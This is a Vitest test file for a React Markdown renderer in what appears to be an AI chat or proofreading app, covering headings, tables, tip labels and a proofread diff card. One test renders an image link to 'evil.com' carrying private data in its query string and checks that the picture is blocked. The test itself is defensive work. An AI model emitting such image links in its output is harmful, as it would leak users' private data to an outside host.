import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { Markdown, ProofreadContext } from '../Markdown'

describe('Markdown', () => {
  it('shows a picture’s description and never loads its address', () => {
    const html = renderToStaticMarkup(<Markdown text="Look: ![a chart](https://evil.com/p.png?d=private)" />)
    expect(html).toContain('a chart')
    expect(html).toContain('Picture not shown, to keep you safe')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('evil.com')
  })

  it('never shows a display-size heading: every level reads as one title size (Spec 03)', () => {
    const html = renderToStaticMarkup(<Markdown text={'# Big\n\n## Medium\n\n#### Small'} />)
    expect(html.match(/<h3>/g)).toHaveLength(3)
    expect(html).not.toMatch(/<h[1245]/)
  })

  it('puts a table in its own sideways-scrolling box, numbers right-aligned', () => {
    const html = renderToStaticMarkup(<Markdown text={'| Otter | Kg |\n| --- | --- |\n| Sea | 30 |\n| River | 1,200.5 |'} />)
    expect(html).toMatch(/^<div class="md"><div class="md-table"><table>/)
    expect(html.match(/<td class="md-num">/g)).toHaveLength(2)
    expect(html).toContain('<td>Sea</td>')
  })

  it('keeps a tip back until the answer finishes, then labels it Good to know', () => {
    const tip = (done: boolean) =>
      renderToStaticMarkup(
        <ProofreadContext.Provider value={{ source: '', done }}>
          <Markdown text={'Answer.\n\n> 💡 Otters hold hands.'} />
        </ProofreadContext.Provider>
      )
    expect(tip(false)).not.toContain('Otters hold hands')
    expect(tip(true)).toContain('Good to know')
    expect(tip(true)).toContain('Otters hold hands')
  })

  it('shows the tip’s label once, when the answer writes it too, as prompts.ts asks', () => {
    const html = renderToStaticMarkup(<Markdown text={'Answer.\n\n> 💡 **Good to know:** waiting a minute usually fixes it.'} />)
    expect(html.match(/Good to know/g)).toHaveLength(1)
    expect(html).toContain('waiting a minute usually fixes it.')
  })
})

describe('the proofread card', () => {
  const answer = '```fixed\nShe went home.\n```\n\n- A reason.'
  const render = (source: string, done = true) =>
    renderToStaticMarkup(
      <ProofreadContext.Provider value={{ source, done }}>
        <Markdown text={answer} />
      </ProofreadContext.Provider>
    )

  it('marks what changed against the highlighted text', () => {
    const html = render('She go home.')
    expect(html).toContain('<del>go</del>')
    expect(html).toContain('<ins>went</ins>')
    expect(html).toContain('Copy fixed text')
    expect(html).toContain('A reason.')
  })

  it('shows plain text until the answer finishes', () => {
    const html = render('She go home.', false)
    expect(html).toContain('She went home.')
    expect(html).not.toContain('<del>')
    expect(html).not.toContain('Copy fixed text')
  })

  it('still shows the fixed text with nothing to compare', () => {
    expect(render('')).toContain('She went home.')
  })

  it('leaves other code blocks alone', () => {
    expect(renderToStaticMarkup(<Markdown text={'```js\nlet a\n```'} />)).toContain('<pre>')
  })
})
